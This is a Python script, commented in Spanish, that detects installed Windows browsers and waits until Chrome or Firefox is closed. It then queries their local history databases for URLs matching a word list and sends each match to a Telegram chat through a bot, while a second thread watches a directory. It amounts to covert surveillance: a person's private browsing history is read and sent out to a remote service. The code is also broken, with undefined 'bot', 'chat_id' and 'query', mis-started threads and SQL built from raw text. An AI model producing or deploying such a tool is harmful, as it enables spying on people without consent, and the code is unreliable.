import serial.tools.list_ports
import time
import webbrowser
import os, json
import sqlite3
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
from plyer import notification
import psutil
import pathlib
import subprocess
import threading

import m.utils as utils
import m.moni as moni
import m.config as config


#********************************************************************************************************************************
# FUNCIÓN PARA BUSCADORES
def find_browsers():
    browsers = []
    program_files = os.environ['PROGRAMFILES']
    program_files_x86 = os.environ.get('PROGRAMFILES(X86)', '')
    paths = [program_files, program_files_x86]

    for path in paths:
        if path:
            chrome_path = os.path.join(path, 'Google\\Chrome\\Application\\chrome.exe')
            if os.path.isfile(chrome_path):
                browsers.append('Google Chrome')
            
            firefox_path = os.path.join(path, 'Mozilla Firefox\\firefox.exe')
            if os.path.isfile(firefox_path):
                browsers.append('Mozilla Firefox')
            
            brave_path = os.path.join(path, 'BraveSoftware\\Brave-Browser\\Application\\brave.exe')
            if os.path.isfile(brave_path):
                browsers.append('Brave Browser')
            
            opera_path = os.path.join(path, 'Opera\\launcher.exe')
            if os.path.isfile(opera_path):
                browsers.append('Opera')
    return browsers


def get_profiles_mozilla(username):
    ruta_perfiles = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
    nombres_perfil = []
    for nombre_carpeta in os.listdir(ruta_perfiles):
        ruta_carpeta = os.path.join(ruta_perfiles, nombre_carpeta)
        if os.path.isdir(ruta_carpeta) and 'default' in nombre_carpeta:
            nombres_perfil.append(nombre_carpeta)
    return nombres_perfil


def search_HistoryBrowser(username, browsers):

    # Obtener ruta de acceso a la base de datos del historial
    if "Google Chrome" in browsers and not check_Chrome():
        res_chromeJSON = Search_ChromeHistory(username)
        diccionario_resultados = json.loads(res_chromeJSON)
        #Enviamos los resultados por telegram
        for resultado in diccionario_resultados:
            mensaje = f"ID: {resultado['id']}\n" \
                    f"URL: {resultado['url']}\n" \
                    f"Visit Count: {resultado['visit_count']}\n" \
                    f"Typed Count: {resultado['typed_count']}\n" \
                    f"Last Visit Time: {resultado['last_visit_time']}\n" \
                    f"Hidden: {resultado['hidden']}\n" \
                    f"Favicon ID: {resultado['favicon_id']}"
            bot.send_message(chat_id, mensaje)

    elif "Mozilla Firefox" in browsers and not check_Firefox():
        profiles = get_profiles_mozilla(username)
        print(profiles)
        for profile in profiles:
            ruta = fr"C:\Users\{username}\AppData\Roaming\Mozilla\Firefox\Profiles\{profile}\places.sqlite"
            conn = sqlite3.connect(ruta)
            cursor = conn.cursor()
            cursor.execute(query)
            column_names = [desc[0] for desc in cursor.description]
            rows = cursor.fetchall()
            results = []
            for row in rows:
                result = {}
                for i, column_name in enumerate(column_names):
                    result[column_name] = row[i]
                results.append(result)
            cursor.close()
            conn.close()
            print (json.dumps(results, ensure_ascii=False))


def crear_consulta_sql(ruta):
    condiciones = []
    
    f = open(ruta, "r")

    for palabra in f.readlines():
        condicion = f"url LIKE '%{palabra}%'"
        condiciones.append(condicion)
    
    condiciones_sql = " OR ".join(condiciones)
    consulta_sql = f"SELECT * FROM urls WHERE {condiciones_sql};"
    
    return consulta_sql.replace("\n", "")


#****************************************************************
#   BUSCAMOS EN EL HISTORY DE CHROME
def Search_ChromeHistory(username):
    # Conectamos a la base de datos del historial de Chrome
    conexion = sqlite3.connect(fr"C:\Users\{username}\AppData\Local\Google\Chrome\User Data\Default\History")
    cursor = conexion.cursor()
    sql_query = crear_consulta_sql("list/BL_words.txt") #Lista de palabras
    print(sql_query)
    cursor.execute(sql_query)
    resultados = cursor.fetchall()
    conexion.close()
    # Convertimos los resultados en un diccionario de Python
    diccionario_resultados = []
    for resultado in resultados:
        diccionario_resultado = {
            "id": resultado[0],
            "url": resultado[1],
            "visit_count": resultado[2],
            "typed_count": resultado[3],
            "last_visit_time": resultado[4],
            "hidden": resultado[5],
            "favicon_id": resultado[6]
        }
        diccionario_resultados.append(diccionario_resultado)

    # Serializamos el diccionario en formato JSON y lo devolvemos
    return json.dumps(diccionario_resultados)

#****************************************************************
#VERIFICADORES DE NAVEGADORES EN FUNCIONAMIENTO EN ESTE MOMENTO

def check_Firefox():
    for proceso in psutil.process_iter(['name']):
        if proceso.info['name'] == 'firefox.exe':
            return True
    return False

def check_Chrome():
    for proceso in psutil.process_iter(['name']):
        if proceso.info['name'] == 'chrome.exe':
            return True
    return False

#***************************************************************
#FUNCION PRINCIPAL
def main():

    #Obtenemos los datos del ordenador
    username = utils.get_Username()
    hostname = utils.get_computer_name()

    #Navegadores instalados
    browsers = find_browsers()

    #Ruta a monitorizar
    dir_moni = config.moniDIR1

    #Hilo1 - Navegadores
    threat1 = threading.Thread(target=search_HistoryBrowser(username, browsers))
    #Hilo2 - Monitorización de directorio
    threat2 = threading.Thread(target=moni.moniDirectory(dir_moni))

    threat1.start()
    threat2.start()


main()